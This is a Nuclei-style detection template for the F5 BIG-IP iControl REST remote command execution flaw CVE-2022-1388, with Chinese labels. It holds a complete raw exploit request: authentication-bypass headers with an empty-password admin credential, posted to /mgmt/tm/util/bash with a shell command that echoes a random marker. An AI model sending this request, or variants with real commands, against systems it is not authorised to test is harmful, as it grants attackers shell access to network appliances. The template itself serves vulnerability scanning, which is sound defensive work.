id: bigip-icontrol-rest-rce

info:
  name: F5 BIG-IP - 远程命令执行(CVE-2022-1388)
  author: wintry
  severity: critical
  description: F5 BIG-IP 远程命令执行漏洞(CVE-2022-1388)
  tags: bigip

http:
  - raw:
      - |+
        POST /mgmt/tm/util/bash HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive, X-F5-Auth-Token
        Authorization: Basic YWRtaW46
        X-F5-Auth-Token: rrr
        X-Forwarded-For: localhost
        Referer: localhost
        Content-Type: application/json

        {"command":"run","utilCmdArgs":"-c echo {{randstr}}"}

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "{{randstr}}"
        part: body
        condition: and

      - type: status
        status:
          - 200
